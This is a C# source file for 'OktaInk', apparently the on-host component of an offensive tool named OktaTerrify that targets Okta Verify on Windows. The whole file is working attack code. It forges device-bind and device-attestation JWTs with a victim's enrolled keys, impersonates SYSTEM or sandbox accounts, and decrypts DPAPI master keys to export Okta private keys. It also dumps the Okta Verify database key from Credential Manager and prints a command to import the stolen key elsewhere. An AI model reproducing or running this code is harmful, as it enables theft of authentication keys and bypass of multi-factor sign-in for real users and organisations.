using Mono.Options;
using System.IO;
using System;
using OktaCommon;
using OktaTerrify.Signers;
using System.Security.Cryptography;
using System.Security.Principal;
using NtApiDotNet;
using OktaCommon.DPAPI;
using System.Text;
using System.Linq;

namespace OktaInk {
    internal class Program {
        
        enum OperationType{
            Unknown,
            SignDeviceBind,
            SignDeviceAttestation,
            ExportPublic,
            ExportPrivate,
            DumpDPAPI,
            DumpDBKey
        }

        static void Main(string[] args) {

            bool showHelp = false;
            string keyId = null;
            string deviceId = null;
            string userId = null;
            string nonce = null;
            string tx = null;
            string audience = null;
            string methodEnrollmentId = null;
            string impersonate = null;
            string issuer = null;
            string subject = null;
            string password = null;
            string pin = null;
            string accessToken = null;
            string context = "Okta Terrify Pwner";
            byte[] protectionSeed = null;
            bool userVerification = false;

            OperationType operationType = OperationType.Unknown;

            //Create larger buffer to allow for lines larger that the default 255 chars
            byte[] inputBuffer = new byte[2048];
            Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
            Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));

            OptionSet option_set = new OptionSet()
                .Add("h|help", "Show this help", v => showHelp = true)
                .Add("c=|context=", "The message context to display to the end user when requesting biometric info: Okta Terrify Pwner (default)", v => context = v)
                .Add("k=|keyId=", "The Windows crypto key id to use for signing", v => keyId = v)
                .Add("d=|deviceId=", "The enrolled Okta Verify device id", v => deviceId = v)
                .Add("u=|userId=", "The enrolled Okta Verify user id", v => userId = v)
                .Add("n=|nonce=", "The random nonce for the pending authentication", v => nonce = v)
                .Add("t=|transactionId=", "The transaction id for the pending authentication", v => tx = v)
                .Add("a=|audience=", "The target audience for the signed JWT (Okta tenant URL)", v => audience = v)
                .Add("m=|methodEnrollmentId=", "The method enrollment id from Okta database", v => methodEnrollmentId = v)
                .Add("i=|impersonate=", "Impersonate using a sandbox account or SYSTEM (username[:instanceid])", v => impersonate = v)
                .Add("s=|protectionSeed=", "System PIN protection seed", v => protectionSeed = v.FromHex())
                .Add("issuer=", "The issuer to embed inside device attestation JWT", v => issuer = v)
                .Add("subject=", "The subject to embed inside device attestation JWT", v => subject = v)
                .Add("p=|password=", "The password of the account used when the CNG software key was created", v => password = v)
                .Add("pin=", "The PIN/password for the non Windows Hello software backed userVerification key", v => pin = v)
                .Add("v|userVerification", "Use the userVerification key instead of the default proofOfPossession", v => userVerification = true)
                .Add("token=", "Azure AD access token for cred.microsoft.com resource", v => accessToken = v)
                .Add<OperationType>("o=|operation=", "Which operation do you want to perform.JWT are we signing (SignDeviceBind|SignDeviceAttestation|ExportPublic|ExportPrivate|DumpDBKey)", v => operationType = v);

                option_set.Parse(args);

            if (showHelp) {
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            byte[] systemPIN = null;

            if(protectionSeed != null) {
                systemPIN = OktaCrypto.GetSystemPin(protectionSeed, OktaCrypto.GenerateClientName(WindowsIdentity.GetCurrent().User.ToString()));
                Console.WriteLine($"System PIN: {systemPIN.Hex()}");
            }

            switch (operationType) {
                case OperationType.SignDeviceBind:

                    if (tx == null || nonce == null || keyId == null || userId == null ||
                        deviceId == null || methodEnrollmentId == null || audience == null) {
                        Console.WriteLine("[!] Tx, Nonce, KeyId, UserId, DeviceId, MethodEnrollmentId and Audience must be supplied to sign");
                        return;
                    }

                    var key = new OktaCommon.Key {
                        KeyId = keyId,
                        Sandboxed = impersonate != null
                    };
                    
                    var jwt = OktaCrypto.PerformingSigning(tx, nonce, key, userId, deviceId, methodEnrollmentId, audience, 
                        impersonate, userVerification, new CngRSAAlgorithm(false, systemPIN,  context), userVerification ? "userVerification" : "proofOfPossession", false);
                    Console.WriteLine(jwt); 

                    break;
                case OperationType.SignDeviceAttestation:

                    if (keyId == null || audience == null ||
                        issuer == null || subject == null ) {
                        Console.WriteLine("[!] KeyId, Audience, Issuer and Subject must be supplied to sign");
                        return;
                    }

                    var attestationKey = new OktaCommon.Key() {
                        KeyId = keyId,
                        Type = KeyType.DeviceAttestation,
                        Sandboxed = impersonate != null
                    };

                    Console.WriteLine($"[+] Device Attestation JWT:\n\n{OktaCrypto.BuildDeviceAttestationJwt(attestationKey, audience, issuer, subject, impersonate)}");
                    break;

                case OperationType.ExportPublic: {

                        string providerName = "";

                        if (keyId == null) {
                            Console.WriteLine("[!] KeyId must be supplied to obtain public key");
                            return;
                        }

                        if (keyId.StartsWith("HDW"))
                            providerName = "Microsoft Platform Crypto Provider";
                        else if (keyId.StartsWith("SFT") || keyId.StartsWith("PNS"))
                            providerName = "Microsoft Software Key Storage Provider";
                        else {
                            providerName = "Microsoft Passport Key Storage Provider";
                        }

                        ThreadImpersonationContext impersonationContext = null;
                        if (impersonate != null) {
                            impersonationContext = OktaCrypto.ImpersonateSandbox(impersonate);
                        }

                        try {

                            var cngKey = CngKey.Open($"{WindowsIdentity.GetCurrent().User}//{Identifiers.OktaClientId}//{keyId}", new CngProvider(providerName));
                            var rsa = new RSACng(cngKey);
                            var publicKey = rsa.ExportParameters(false);
                            Console.WriteLine(Utils.Base64Url(publicKey.Modulus));

                        } finally {
                            if (impersonationContext != null)
                                impersonationContext.Revert();
                        }
                        break;
                    }
                case OperationType.ExportPrivate: {

                        if (keyId == null) {
                            Console.WriteLine("[!] KeyId must be supplied to obtain public key");
                            return;
                        }

                        var cngKey = OktaCrypto.FindCngCryptoFileByKeyId(keyId, impersonate);

                        if(cngKey == null) {
                            Console.WriteLine($"[!] Failed to find key with ID {keyId}");
                            return;
                        }

                        Console.WriteLine($"[+] Found key with ID {keyId}\n" +
                           $"  Name: {cngKey.KeyBlob.Name}\n" +
                           cngKey.KeyBlob.PublicProperties.Aggregate("", (a, b) => $"{a}  {(!string.IsNullOrEmpty(b.Name) ? b.Name : b.Type.ToString())}: {cngKey.KeyBlob.GetProperty<string>(b.Name)}\n"));
     
                        var masterKeyFile = MasterKeyFile.FindMasterKey(cngKey.KeyBlob.PrivateKey.GuidMasterKey);
                        
                        if(masterKeyFile == null) {
                            Console.WriteLine($"[!] Failed to find master key {cngKey.KeyBlob.PrivateKey.GuidMasterKey}");
                            return;
                        }

                        if (password == null && impersonate == null) {
                            Console.WriteLine("[!] To decrypt a CNG private key, the password for the account must be known");
                            return;
                        }

                        bool domainUser = (Environment.UserDomainName != Environment.MachineName);
                        var dpapiKey = OktaCrypto.DeriveKeyFromPassword(WindowsIdentity.GetCurrent().User.ToString(), password, domainUser);

                                                       
                        masterKeyFile.MasterKey.Decrypt(dpapiKey);

                        Console.WriteLine($"[+] Decrypted DPAPI master key {cngKey.KeyBlob.PrivateKey.GuidMasterKey}: {masterKeyFile.MasterKey.Key.Hex()}");

                        var privatePropertiesBlob = cngKey.KeyBlob.PrivateProperties.Decrypt(masterKeyFile.MasterKey.Key,
                                                                     Encoding.UTF8.GetBytes("6jnkd5J3ZdQDtrsu\0"));

                        byte[] entropy = Encoding.UTF8.GetBytes("xT5rZW5qVVbrvpuA\0");

                        if (privatePropertiesBlob.Length > 0) {
                            var privateProperties = CNGProperty.Parse(new BinaryReader(new MemoryStream(privatePropertiesBlob)), (uint)privatePropertiesBlob.Length);
                            var uiPolicy = privateProperties.FirstOrDefault(p => p.Name == "UI Policy");

                            if (!uiPolicy.Equals(default)) { 
                                var flags = BitConverter.ToInt32(uiPolicy.Value, 4);

                                if((flags & 0x3) >= 1) {
                                           
                                    if (pin == null) {
                                        Console.WriteLine("[!] Key is protected with PIN/Password, specify with --pin argument");
                                    } else {
                                        entropy = entropy.Concat(SHA512.Create().ComputeHash(new MemoryStream(Encoding.Unicode.GetBytes(pin)))).ToArray();
                                    }                                                                                                      
                                };            
                            }                                                        
                        }
      
                        var privateKeyBytes = cngKey.KeyBlob.PrivateKey.Decrypt(masterKeyFile.MasterKey.Key , entropy);   
                        Console.WriteLine("[+] Import key command:\n");
                        Console.WriteLine($"  OktaTerrify --import -k {keyId} -p {Convert.ToBase64String(privateKeyBytes)}");
                        break;
                    }

                case OperationType.DumpDBKey:

                    var valueKeyName = $"OKTA_VERIFY_STORE_{OktaCrypto.GenerateClientName(NtToken.CurrentUser.Sid.ToString())}";
                    Console.WriteLine($"[=] Credential manager key name: {valueKeyName}");

                    var credential = NtApiDotNet.Win32.Security.Credential.CredentialManager.GetCredential(valueKeyName, NtApiDotNet.Win32.Security.Credential.CredentialType.Generic, false);
                    if(credential.IsSuccess)
                        Console.WriteLine($"[+] DB Key: {OktaCrypto.OktaHashNG(credential.Result.CredentialBlob).Hex()}");
                    else
                        Console.WriteLine($"[!] Failed to find credential {valueKeyName} via credential manager");

                    break;

                default: 
                    Console.WriteLine("[!] Signing operation type should be specified");
                    break;

    
            }
        }
    }
}